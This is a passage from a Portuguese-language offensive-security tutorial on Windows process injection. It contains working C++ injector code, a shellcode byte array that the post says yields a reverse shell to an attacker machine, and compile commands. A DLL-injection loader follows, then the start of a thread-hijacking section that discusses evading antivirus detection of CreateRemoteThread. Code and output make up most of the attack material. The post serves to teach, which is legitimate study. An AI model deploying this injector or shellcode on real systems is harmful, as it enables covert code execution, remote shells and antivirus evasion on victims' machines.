<span class="s">"</span><span class="se">\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">findPID</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procName</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hSnapshot</span><span class="p">;</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">proc</span><span class="p">;</span>

    <span class="c1">// snapshot de todos os processos em execucao</span>
    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hSnapshot</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// inicializando dwSize</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

    <span class="c1">// inicio da iteracao, primeiro processo</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>

    <span class="c1">// loop para iterar sobre os processos</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// fecha o handle aberto</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">procH</span><span class="p">;</span> <span class="c1">// process handle</span>
    <span class="n">HANDLE</span> <span class="n">remoteT</span><span class="p">;</span> <span class="c1">// remote thread</span>
    <span class="n">LPVOID</span> <span class="n">remoteB</span><span class="p">;</span> <span class="c1">// remote buffer</span>

    <span class="n">pid</span> <span class="o">=</span> <span class="n">findPID</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="c1">// cria o handle para o processo</span>
    <span class="n">procH</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">(</span><span class="n">pid</span><span class="p">));</span>

    <span class="c1">// aloca o buffer de memoria no processo remoto</span>
    <span class="n">remoteB</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="c1">// copia o payload entre os processos</span>
    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="n">remoteB</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// Iniciamos uma thread com o payload copiado</span>
    <span class="n">remoteT</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">remoteB</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">procH</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Podemos compilar o programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>x86_64-w64-mingw32-gcc dropper.cpp <span class="nt">-o</span> dropper.exe <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span>
</pre></table></code></div></div><p>Uma vez com o executável na máquina Windows alvo, podemos abrir uma aplicação qualquer, no exemplo utilizei o <code class="language-plaintext highlighter-rouge">Notepad.exe</code> e invocar o dropper passando o nome do processo.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807194311.png" alt="" /></p><p>E conseguimos o <em>reverse shell</em> na máquina atacante.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807194340.png" alt="" /></p><h2 id="validando-a-injeção">Validando a Injeção</h2><p>Até aqui, ok, recebemos a conexão reversa do alvo e vimos que o <code class="language-plaintext highlighter-rouge">dropper.exe</code> se encerrou logo após sua execução, porém, é possível validar sua eficácia. Para isso, podemos usar o programa <a href="https://processhacker.sourceforge.io/downloads.php">Process Hacker 2</a>. Este programa mapeia todos os processos em execução no Windows e nos trás informações completas sobre estes processos.</p><p>Ao iniciarmos o <em>Process Hacker</em>, já podemos ver que o programa <code class="language-plaintext highlighter-rouge">Notepad.exe</code> criou um novo processo invocando o <code class="language-plaintext highlighter-rouge">cmd.exe</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807194911.png" alt="" /></p><p>Se navegarmos para a aba “<em>Network</em>” podemos ver que o Notepad está fazendo uma conexão TCP para a máquina atacante.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807195240.png" alt="" /></p><p>Quando expandimos o processo Notepad.exe e analisamos a aba “<em>Memory</em>”, podemos rolar a barra até encontrarmos as regiões de memória com permissão de leitura e execução (RX) que correspondem ao nosso <em>buffer</em>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807200156.png" alt="" /></p><p>E se analisarmos as DLLs carregadas, vemos que o Notepad carregou a <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> responsável pela comunicação TCP, algo que nunca aconteceria em circunstâncias normais.</p><h1 id="dll-injection"><em>DLL Injection</em></h1><p>Outra técnica de <em>process injection</em> bastante difundida é o <em>DLL Injection</em>, onde forçamos uma aplicação a carregar uma DLL maliciosa. Por mais que <code class="language-plaintext highlighter-rouge">DLLs</code> e <code class="language-plaintext highlighter-rouge">.exe</code> façam parte da mesma família, é preciso entender um pouco sobre suas diferenças e sobre a estrutura básica de uma DLL.</p><p>Quando executamos um <code class="language-plaintext highlighter-rouge">.exe</code>, o SO separa um espaço de memória, carrega o executável neste espaço e cria um processo, só a partir disso o carregador do SO procura pelo ponto de entrada do executável para o iniciar, o que geralmente é a função <code class="language-plaintext highlighter-rouge">main</code> oi <code class="language-plaintext highlighter-rouge">WinMain</code> quando ela existe.</p><p>Já no caso das DLLs, como são bibliotecas dinâmicas com intuito de exportar funções, elas podem ser carregadas por vários programas simultaneamente. Portanto, uma DLL só é invocada, quando um processo na memória, precisa dos seus recursos por qualquer motivo, a carregando dentro de seu próprio espaço. Neste caso, a DLL só é carregada quando todo o processo já foi criado, fazendo com que ela seja executada instantaneamente quando é invocada.</p><p>Quando uma DLL é carregada em um processo no Windows, o sistema operacional invoca uma função especial chamada <strong>DllMain</strong> como ponto de entrada da DLL. Essa função é chamada pelo carregador do Windows sempre que ocorrem certos eventos no ciclo de vida da DLL, como quando a DLL é carregada ou descarregada do processo, ou quando uma nova <em>thread</em> é criada ou encerrada no processo que usa a DLL.</p><p>A assinatura da função <code class="language-plaintext highlighter-rouge">DllMain</code> é a seguinte:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><strong>HMODULE hModule:</strong> Um handle para o módulo da DLL. Esse handle pode ser usado para identificar a instância da DLL;<li><strong>DWORD ul_reason_for_call:</strong> Um valor que indica o motivo pelo qual a função <code class="language-plaintext highlighter-rouge">DllMain</code> está sendo chamada. Pode assumir um dos seguintes valores:<ul><li><code class="language-plaintext highlighter-rouge">DLL_PROCESS_ATTACH</code>: A DLL está sendo carregada no espaço de endereço de um processo.<li><code class="language-plaintext highlighter-rouge">DLL_THREAD_ATTACH</code>: Uma <em>thread</em> está sendo criada no processo que já está carregando a DLL.<li><code class="language-plaintext highlighter-rouge">DLL_THREAD_DETACH</code>: Uma <em>thread</em> que está sendo encerrada está descarregando a DLL.<li><code class="language-plaintext highlighter-rouge">DLL_PROCESS_DETACH</code>: A DLL está sendo descarregada do espaço de endereço de um processo.</ul><li><strong>LPVOID lpReserved:</strong> Reservado para uso futuro. Normalmente, é NULL, mas pode ter um valor especial durante a fase de encerramento do processo.</ul><p>De forma bem simplista, a função <code class="language-plaintext highlighter-rouge">DllMain</code> tem o seguinte formato:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
                      <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
                      <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
        <span class="c1">// Código de inicialização quando a DLL é carregada</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
        <span class="c1">// Código de inicialização quando um thread é criado</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
        <span class="c1">// Código de limpeza quando um thread é encerrado</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="c1">// Código de limpeza quando a DLL é descarregada</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span> <span class="c1">// Indica que a inicialização foi bem-sucedida</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="eventos-da-dllmain">Eventos da DllMain</h2><ol><li><p><strong>DLL_PROCESS_ATTACH:</strong></p><ul><li>Esse evento ocorre quando a DLL é carregada pela primeira vez no espaço de endereço de um processo.<li>Geralmente, você coloca código de inicialização aqui, como a alocação de memória, inicialização de dados, ou configuração de estados globais.<li>Retornar <code class="language-plaintext highlighter-rouge">FALSE</code> nesse ponto impede que a DLL seja carregada.</ul><li><p><strong>DLL_THREAD_ATTACH:</strong></p><ul><li>Esse evento ocorre quando uma nova <em>thread</em> é criada no processo que já está carregando a DLL.<li>É raramente usado, mas pode ser útil se a DLL precisar fazer alguma inicialização específica para cada <em>thread</em>.</ul><li><p><strong>DLL_THREAD_DETACH:</strong></p><ul><li>Esse evento ocorre quando uma <em>thread</em> está sendo encerrada no processo que está carregando a DLL.<li>Similar ao <code class="language-plaintext highlighter-rouge">DLL_THREAD_ATTACH</code>, é raramente usado, mas pode ser necessário para limpar recursos alocados para cada <em>thread</em>.</ul><li><p><strong>DLL_PROCESS_DETACH:</strong></p><ul><li>Esse evento ocorre quando a DLL está sendo descarregada do espaço de endereço de um processo.<li>É usado para liberar recursos alocados durante <code class="language-plaintext highlighter-rouge">DLL_PROCESS_ATTACH</code> ou para fazer qualquer outra limpeza necessária.</ul></ol><p>Uma DLL “convencional” tem, além da <code class="language-plaintext highlighter-rouge">DllMain</code> uma série de funções para serem exportadas (essa é sua função), porém, no contexto <em>hacking</em> dificilmente há necessidade de haver outras funções. Isso se dá pelo fato de que a <code class="language-plaintext highlighter-rouge">DllMain</code> é executada instantaneamente assim que a DLL é carregada em um processo, fazendo com que todo o código malicioso que ela contenha, também seja descarregado. Portanto, esta é a solução mais simples.</p><h2 id="criando-uma-dll">Criando uma DLL</h2><p>Para fins de estudo, criaremos nossa própria DLL para ser usada no <em>process injection</em>, a ideia é criar uma simples caixa de texto que será invocada quando a DLL for carregada em um processo já existente.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
</span>
<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
            <span class="n">MessageBox</span><span class="p">(</span>
                    <span class="nb">NULL</span><span class="p">,</span>
                    <span class="s">"Do you realy want to hack the planet??!"</span><span class="p">,</span>
                    <span class="s">"H41stur"</span><span class="p">,</span>
                    <span class="n">MB_YESNO</span>
                    <span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Podemos compilar o objeto:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>x86_64-w64-mingw32-g++ <span class="nt">-shared</span> <span class="nt">-o</span> mydll.dll mydll.cpp <span class="nt">-fpermissive</span>
</pre></table></code></div></div><p>Após a compilação, podemos armazená-la em algum diretório da máquina alvo, em meu caso ficará em <code class="language-plaintext highlighter-rouge">c:\mydll.dll</code>.</p><h2 id="injetando-a-dll">Injetando a DLL</h2><p>O programa que fará a injeção da DLL é basicamente o mesmo utilizado para injeção de código, pois o processo é idêntico, somente três implementações foram feitas:</p><ol><li>O <em>payload</em> que antes era um <em>shellcode</em> foi substituído pelo caminho da DLL em disco (<code class="language-plaintext highlighter-rouge">c:\mydll.dll</code>);<li>Antes de injetar e executar a DLL, é preciso obter o endereço de memória da <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, pois esta será uma chamada de API que será executada no contexto da vítima e ela precisará desta função para carregar nossa DLL;<li>Na função <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> passamos o endereço da <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> como argumento <code class="language-plaintext highlighter-rouge">lpStartAddress</code> e a variável que contém o endereço da nossa DLL no parâmetro <code class="language-plaintext highlighter-rouge">lpParameter</code>.</ol><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">Dll</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">mydll.dll"</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Dll_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Dll</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">findPID</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procName</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hSnapshot</span><span class="p">;</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">proc</span><span class="p">;</span>

    <span class="c1">// snapshot de todos os processos em execucao</span>
    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hSnapshot</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// inicializando dwSize</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

    <span class="c1">// inicio da iteracao, primeiro processo</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>

    <span class="c1">// loop para iterar sobre os processos</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// fecha o handle aberto</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">procH</span><span class="p">;</span> <span class="c1">// process handle</span>
    <span class="n">HANDLE</span> <span class="n">remoteT</span><span class="p">;</span> <span class="c1">// remote thread</span>
    <span class="n">LPVOID</span> <span class="n">remoteB</span><span class="p">;</span> <span class="c1">// remote buffer</span>

    <span class="c1">// handle para kernel32 para encontrar LoadLibraryA</span>
    <span class="n">HMODULE</span> <span class="n">hKernel32</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"Kernel32"</span><span class="p">);</span>
    <span class="n">VOID</span> <span class="o">*</span><span class="n">lb</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"LoadLibraryA"</span><span class="p">);</span>

    <span class="n">pid</span> <span class="o">=</span> <span class="n">findPID</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="c1">// cria o handle para o processo</span>
    <span class="n">procH</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">(</span><span class="n">pid</span><span class="p">));</span>

    <span class="c1">// aloca o buffer de memoria no processo remoto</span>
    <span class="n">remoteB</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">Dll_len</span><span class="p">,</span> <span class="p">(</span><span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="c1">// copia o payload entre os processos</span>
    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="n">remoteB</span><span class="p">,</span> <span class="n">Dll</span><span class="p">,</span> <span class="n">Dll_len</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// Iniciamos uma thread com o payload copiado</span>
    <span class="n">remoteT</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lb</span><span class="p">,</span> <span class="n">remoteB</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">procH</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


</pre></table></code></div></div><p>Compilamos o programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>x86_64-w64-mingw32-gcc <span class="nt">-O2</span> dropperDLL.cpp <span class="nt">-o</span> dropperDLL.exe <span class="nt">-mconsole</span> <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
</pre></table></code></div></div><p>Para testar, iniciamos uma instância do Notepad.exe na máquina alvo e invocamos nosso programa.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807215827.png" alt="" /></p><p>E a DLL maliciosa foi injetada com sucesso no processo alvo.</p><p>Se analisarmos com o <em>Process Hacker 2</em> pela aba “<em>Memory</em>”, podemos ver na área de memória com permissões de leitura e execução, que nossa DLL foi de fato carregada no processo.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807220003.png" alt="" /></p><h1 id="thread-hijacking"><em>Thread Hijacking</em></h1><p>Nos exemplos anteriores testamos injeção tanto de código quanto de DLL, ambos os processos quase iguais, a diferenciar pouca coisa, porém, uma característica em comum entre ambas as técnicas é a criação de uma nova <em>thread</em> que executa o <em>payload</em>. Utilizamos nos exemplos a função <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> para este fim.</p><p>Independente do método de ofuscação utilizado, o uso desta função se torna “manjado” por vários antivírus, o que a torna um alvo em potencial no processo de detecção.</p><p>Porém, existem inúmeras técnicas de <em>process injection</em> que não utilizam a função <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>, uma delas é o <em>thread hijacking</em>.</p><p><em>Thread hijacking</em> nada mais é do que forçar uma <em>thread</em> original do nosso processo alvo a executar nosso <em>payload</em>. Desta forma nenhuma nova <em>thread</em> precisa ser criada.</p><p>No artigo anterior, <a href="https://h41stur.com/posts/get-process/">Enumerando Processos pelo Nome</a> tivemos uma visão global sobre a <a href="https://learn.microsoft.com/en-us/windows/win32/toolhelp/tool-help-library"><em>Tool Help Library</em></a> que nos permite enumerar todos os processos, <em>threads</em>, módulos e memória dos processos em execução.</p><p>Inclusive, nos exemplos deste artigo, utilizamos a <em>Tool Help Library</em> para criar um <em>snapshot</em> dos processos e encontrarmos o processo alvo pelo nome.</p><p>Seguindo o mesmo princípio, também podemos extrair um <em>snapshot</em> de todas as <em>threads</em> em execução e encontrar, por exemplo, a primeira <em>thread</em> criada pelo nosso processo alvo, fazemos isso comparando o PID do processo com o parâmetro <code class="language-plaintext highlighter-rouge">th32OwnerProcessID</code> contido na estrutura <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32">THREADENTRY32</a>. Quando encontrarmos esta <em>thread</em>, podemos criar um <em>handle</em> que aponta para ela com a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread">OpenThread</a> utilizando seu ID.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td 